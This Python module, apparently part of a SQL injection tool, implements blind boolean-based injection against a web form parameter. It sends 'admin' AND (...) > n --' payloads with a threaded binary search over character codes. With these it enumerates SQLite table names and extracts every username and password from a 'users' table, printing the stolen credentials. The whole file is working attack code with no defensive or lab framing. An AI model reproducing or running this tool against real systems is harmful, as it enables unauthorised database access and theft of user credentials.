# sqli_tool/extractor.py
import string
import sys
import concurrent.futures
from .utils import send_request
from .analyzer import ResponseInfo

def extract_single_char(url, param_name, method, base_data, query, pos):
    """
    Helper for threading: extracts one character at a specific position.
    """
    low = 32
    high = 126
    found_ascii = 0
    
    while low <= high:
        mid = (low + high) // 2
        # Use unicode() for SQLite
        payload = f"admin' AND ({query.format(pos=pos)}) > {mid} --"
        
        test_data = base_data.copy()
        test_data[param_name] = payload
        r = send_request(url, method, test_data)
        
        if r and r.status_code == 200:
            low = mid + 1
            found_ascii = low
        else:
            high = mid - 1
    return chr(found_ascii) if found_ascii > 0 else None

def extract_string_threaded(url, param_name, method, base_data, query, max_len=30):
    """
    THREADED EXTRACTION: Extracts an entire string 10x faster.
    """
    result = [""] * (max_len + 1)
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_pos = {executor.submit(extract_single_char, url, param_name, method, base_data, query, i): i for i in range(1, max_len + 1)}
        for future in concurrent.futures.as_completed(future_to_pos):
            pos = future_to_pos[future]
            char = future.result()
            if char:
                result[pos] = char
                sys.stdout.write(f"\r[*] Threaded Extraction in progress... {''.join(filter(None, result))}")
                sys.stdout.flush()
    
    final_str = "".join(filter(None, result)).strip()
    return final_str

def discover_db_schema(url, param_name, method, base_data):
    """
    ENUMERATION: Automatically finds table names in SQLite.
    """
    print("\n[*] Enumerating Database Schema (Automatic Discovery)...")
    # Query to find table names: SELECT group_concat(name) FROM sqlite_master WHERE type='table'
    query = "SELECT unicode(SUBSTR((SELECT group_concat(name) FROM sqlite_master WHERE type='table'),{pos},1))"
    tables = extract_string_threaded(url, param_name, method, base_data, query, max_len=50)
    print(f"\n[+] Found Tables: {tables}")
    return tables.split(",")

def dump_passwords_all(url, param_name, method, base_data, db_session=None):
    """
    FULL DUMP: Extracts ALL usernames and passwords from the 'users' table.
    """
    print("\n[*] Starting Full User Database Dump...")
    extracted_data = []

    # 1. First, find how many users there are
    for user_id in range(1, 10): # Try IDs 1 to 10
        # Check if user exists
        check_payload = f"admin' AND (SELECT 1 FROM users WHERE id={user_id}) --"
        test_data = base_data.copy()
        test_data[param_name] = check_payload
        r = send_request(url, method, test_data)
        
        if r and r.status_code == 200:
            print(f"\n[*] Extracting details for User {user_id}...")
            
            # Extract Username
            user_query = f"SELECT unicode(SUBSTR((SELECT username FROM users WHERE id={user_id}),{{pos}},1))"
            username = extract_string_threaded(url, param_name, method, base_data, user_query, max_len=15)
            
            # Extract Password
            pass_query = f"SELECT unicode(SUBSTR((SELECT password FROM users WHERE id={user_id}),{{pos}},1))"
            password = extract_string_threaded(url, param_name, method, base_data, pass_query, max_len=20)
            
            extracted_data.append({"id": user_id, "user": username, "pass": password})
            print(f"\n[+] Success: User '{username}' -> Pass: '{password}'")
        else:
            break
            
    return extracted_data
